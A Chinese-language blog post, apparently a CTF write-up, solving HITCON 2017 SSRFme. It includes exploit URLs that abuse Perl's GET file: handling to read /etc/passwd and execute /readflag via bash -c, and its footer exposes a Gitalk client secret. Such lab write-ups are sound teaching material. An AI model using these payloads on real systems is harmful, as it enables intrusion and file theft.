@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>GET命令执行漏洞[HITCON 2017]SSRFme |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="GET命令执行漏洞[HITCON 2017]SSRFme |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="GET命令执行漏洞[HITCON 2017]SSRFme"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/NKxxYI57q/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>GET命令执行漏洞[HITCON 2017]SSRFme</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-02，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>源码如下<br>
+<img src="https://guokeya.github.io/post-images/1577959882761.png" alt="" loading="lazy"><br>
+分析代码<br>
+1.<br>
+首先就是根据IP。创建个沙盒文件夹</p>
+<!-- more -->
+<p>文件夹名字为md5('orange'+IP)<br>
+2.执行命令<br>
+GET  escapeshellarg($_GET['url'])函数作用是。将我们输入的转换成可以执行在bash执行的命令。比如转移单引号什么的。确保字符串能够被执行<br>
+3.创建文件夹 将我们输入的filename。生成文件夹。这步骤没啥用。只要不输入绝对路径。就不会生成文件夹。所有文件都会在当前沙盒文件夹内</p>
+<pre><code>例如：
+输入/var/www/html/
+会在当前目录创建一个html的文件夹。
+输入1.php
+获取不到路径。就不会创建文件夹
+</code></pre>
+<p>4.将命令执行结果放入filename我们输入1.php<br>
+dir=NULL也就不创建目录。然后将GET命令执行的结果放入1.php<br>
+解题<br>
+第一反应。<br>
+直接命令拼接。放入1.phpc<br>
+<code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=%26%26whoami&amp;filename=a</code><br>
+试了所有的命令拼接符。输出到A。都返回400<br>
+<img src="https://guokeya.github.io/post-images/1577960706939.png" alt="" loading="lazy"><br>
+看了writeup才知道。这里是考GET命令执行漏洞<br>
+GET命令类似于CURL。用来发起一个请求。并且支持file协议<br>
+<img src="https://guokeya.github.io/post-images/1577960716867.png" alt="" loading="lazy"><br>
+也就是说。创建一个'whoami|'。然后GET 'file:whoami|'<br>
+就可以执行whoami命令</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=/etc/passwd
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:/etc/passwd&amp;filename=a
+执行的命令如下：GET file:/etc/passwd &gt;a
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577960736359.png" alt="" loading="lazy"><br>
+读取下根目录文件</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=/
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:/&amp;filename=a
+GET file:/ &gt;a
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577960762663.png" alt="" loading="lazy"><br>
+根目录下有flag和Readflag<br>
+估计要执行readflag读取flag<br>
+根据上面讲过的执行命令。直接构造bash -c '/readflag'&gt;a就好了</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=bash%20-c%20%27/readflag%27|
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:bash%20-c%20%27/readflag%27|&amp;filename=a
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577960787168.png" alt="" loading="lazy"></figure>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/oIox5MYU2/">
+              <span class="post-title">
+                Xctf smarty解题思路&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
